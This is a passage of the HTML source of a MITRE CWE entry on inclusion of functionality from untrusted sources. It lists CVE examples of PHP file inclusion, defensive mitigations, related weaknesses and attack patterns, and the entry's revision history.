				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2198" target="_blank"&gt;CVE-2005-2198&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0128" target="_blank"&gt;CVE-2004-0128&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable variable in
						configuration script leads to file inclusion.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1864" target="_blank"&gt;CVE-2005-1864&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP file inclusion.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1869" target="_blank"&gt;CVE-2005-1869&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP file inclusion.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1870" target="_blank"&gt;CVE-2005-1870&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP file inclusion.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2154" target="_blank"&gt;CVE-2005-2154&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP local file
						inclusion.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1704" target="_blank"&gt;CVE-2002-1704&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP remote file
						include.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1707" target="_blank"&gt;CVE-2002-1707&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP remote file
						include.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1964" target="_blank"&gt;CVE-2005-1964&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP remote file
						include.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1681" target="_blank"&gt;CVE-2005-1681&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP remote file
						include.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2086" target="_blank"&gt;CVE-2005-2086&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP remote file
						include.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0127" target="_blank"&gt;CVE-2004-0127&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Directory traversal vulnerability in PHP include
						statement.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1971" target="_blank"&gt;CVE-2005-1971&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Directory traversal vulnerability in PHP include
						statement.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3335" target="_blank"&gt;CVE-2005-3335&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP file inclusion issue, both remote and local;
						local include uses ".." and "%00" characters as a manipulation, but many
						remote file inclusion issues probably have this
						vector.&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential_Mitigations"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_829_Potential_Mitigations" id="oc_829_Potential_Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;
				&lt;tbody&gt;&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Libraries or Frameworks&lt;/p&gt;&lt;p&gt;Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Enforcement by Conversion&lt;/p&gt;&lt;p&gt;When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.&lt;/p&gt;&lt;p&gt;For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability [&lt;a href="http://cwe.mitre.org/data/slices/2000.html#R.829.1" target="_blank"&gt;R.829.1&lt;/a&gt;]. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid &lt;a href="http://cwe.mitre.org/data/definitions/602.html" target="_blank"&gt;CWE-602&lt;/a&gt;. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Operation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Sandbox or Jail&lt;/p&gt;&lt;p&gt;Run your code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by your software.&lt;/p&gt;&lt;p&gt;OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows you to specify
							restrictions on file operations.&lt;/p&gt;&lt;p&gt;This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of your application may still be subject
							to compromise.&lt;/p&gt;&lt;p&gt;Be careful to avoid &lt;a href="http://cwe.mitre.org/data/definitions/243.html" target="_blank"&gt;CWE-243&lt;/a&gt; and other weaknesses related to jails. &lt;/p&gt;&lt;p class="optheading"&gt;&lt;i&gt;Effectiveness: Limited&lt;/i&gt;&lt;/p&gt;&lt;div class="indent smaller"&gt;
						&lt;p&gt;The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. &lt;/p&gt;
					&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Operation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Environment Hardening&lt;/p&gt;&lt;p&gt;Run your code using the lowest privileges that are required to accomplish the necessary tasks [&lt;a href="http://cwe.mitre.org/data/slices/2000.html#R.829.2" target="_blank"&gt;R.829.2&lt;/a&gt;]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Input Validation&lt;/p&gt;&lt;p&gt;Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does. Do not rely exclusively on looking for malicious or malformed
							inputs (i.e., do not rely on a blacklist). However, blacklists can be
							useful for detecting potential attacks or determining which inputs are
							so malformed that they should be rejected outright.&lt;/p&gt;&lt;p&gt;When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if you are
							expecting colors such as "red" or "blue."&lt;/p&gt;&lt;p&gt;For filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as &lt;a href="http://cwe.mitre.org/data/definitions/23.html" target="_blank"&gt;CWE-23&lt;/a&gt;, and exclude directory separators such as "/" to avoid &lt;a href="http://cwe.mitre.org/data/definitions/36.html" target="_blank"&gt;CWE-36&lt;/a&gt;. Use a whitelist of allowable file extensions, which will help to avoid &lt;a href="http://cwe.mitre.org/data/definitions/434.html" target="_blank"&gt;CWE-434&lt;/a&gt;. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Operation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Identify and Reduce Attack Surface&lt;/p&gt;&lt;p&gt;Store library, include, and utility files outside of the web document
							root, if possible. Otherwise, store them in a separate directory and use
							the web server's access control capabilities to prevent attackers from
							directly requesting them. One common practice is to define a fixed
							constant in each calling program, then check for the existence of the
							constant in the library/include file; if the constant does not exist,
							then the file was directly requested, and it can exit
							immediately.&lt;/p&gt;&lt;p&gt;This significantly reduces the chance of an attacker being able to
							bypass any protection mechanisms that are in the base program but not in
							the include files. It will also reduce your attack surface.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Implementation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Identify and Reduce Attack Surface&lt;/p&gt;&lt;p&gt;Understand all the potential areas where untrusted inputs can enter
							your software: parameters or arguments, cookies, anything read from the
							network, environment variables, reverse DNS lookups, query results,
							request headers, URL components, e-mail, files, filenames, databases,
							and any external systems that provide data to the application. Remember
							that such inputs may be obtained indirectly through API calls.&lt;/p&gt;&lt;p&gt;Many file inclusion problems occur because the programmer assumed that
							certain inputs could not be modified, especially for cookies and URL
							components.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Operation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Firewall&lt;/p&gt;&lt;p&gt;Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.&lt;/p&gt;&lt;p class="optheading"&gt;&lt;i&gt;Effectiveness: Moderate&lt;/i&gt;&lt;/p&gt;&lt;div class="indent smaller"&gt;
						&lt;p&gt;An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.&lt;/p&gt;
					&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_829_Relationships" id="oc_829_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
         &lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;669&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/669.html" target="_blank"&gt;Incorrect Resource Transfer Between Spheres&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;813&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/813.html" target="_blank"&gt;OWASP Top Ten 2010 Category A4 - Insecure Direct Object References&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2010) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;809&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;864&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/864.html" target="_blank"&gt;2011 Top 25 - Insecure Interaction Between Components&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2011 CWE/SANS Top 25 Most Dangerous Software Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;900&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
         &lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;98&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/98.html" target="_blank"&gt;Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;827&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/827.html" target="_blank"&gt;Improper Control of Document Type Definition&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;830&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="http://cwe.mitre.org/data/definitions/830.html" target="_blank"&gt;Inclusion of Web Functionality from an Untrusted Source&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
      &lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related_Attack_Patterns"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_829_Related_Attack_Patterns" id="oc_829_Related_Attack_Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.7)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/175.html" target="_blank"&gt;175&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Code Inclusion&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/253.html" target="_blank"&gt;253&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Remote Code Inclusion&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/101.html" target="_blank"&gt;101&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Server Side Include (SSI) Injection&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/193.html" target="_blank"&gt;193&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP Remote File Inclusion&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/251.html" target="_blank"&gt;251&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Local Code Inclusion&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/252.html" target="_blank"&gt;252&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;PHP Local File Inclusion&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/38.html" target="_blank"&gt;38&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Leveraging/Manipulating Configuration File Search Paths&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/103.html" target="_blank"&gt;103&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Clickjacking&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/181.html" target="_blank"&gt;181&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Flash File Overlay&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/222.html" target="_blank"&gt;222&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;iFrame Overlay&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/185.html" target="_blank"&gt;185&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Software Download&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/186.html" target="_blank"&gt;186&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Software Update&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/187.html" target="_blank"&gt;187&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Automated Software Update&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/111.html" target="_blank"&gt;111&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;JSON Hijacking (aka JavaScript Hijacking)&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/184.html" target="_blank"&gt;184&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Software Integrity Attacks&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://capec.mitre.org/data/definitions/35.html" target="_blank"&gt;35&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Leverage Executable Code in Nonexecutable Files&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_829_References" id="oc_829_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;
				&lt;tbody&gt;&lt;tr&gt;&lt;td valign="top"&gt;&lt;div id="R.829.1"&gt;&lt;div id="REF-21"&gt;[R.829.1] [REF-21] OWASP. "OWASP Enterprise Security API (ESAPI) Project". &amp;lt;&lt;a href="http://www.owasp.org/index.php/ESAPI" target="_blank"&gt;http://www.owasp.org/index.php/ESAPI&lt;/a&gt;&amp;gt;.&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;div id="R.829.2"&gt;&lt;div id=""&gt;[R.829.2] Sean Barnum and
								Michael Gegick. "Least Privilege". 2005-09-14. &amp;lt;&lt;a href="https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html" target="_blank"&gt;https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html&lt;/a&gt;&amp;gt;.&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content_History"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_829_Content_History" id="oc_829_Content_History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top"&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-11-29&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;Internal CWE Team&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top"&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2011-06-01&lt;/td&gt;&lt;td valign="top"&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common_Consequences&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2011-06-27&lt;/td&gt;&lt;td valign="top"&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common_Consequences, Demonstrative_Examples,
						Observed_Examples, Potential_Mitigations, Related_Attack_Patterns,
						Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2011-09-13&lt;/td&gt;&lt;td valign="top"&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential_Mitigations, References,
						Relationships&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;



            &lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="http://cwe.mitre.org/data/slices/2000.html#top" target="_blank"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

            &lt;/body&gt;
        &lt;/html&gt;


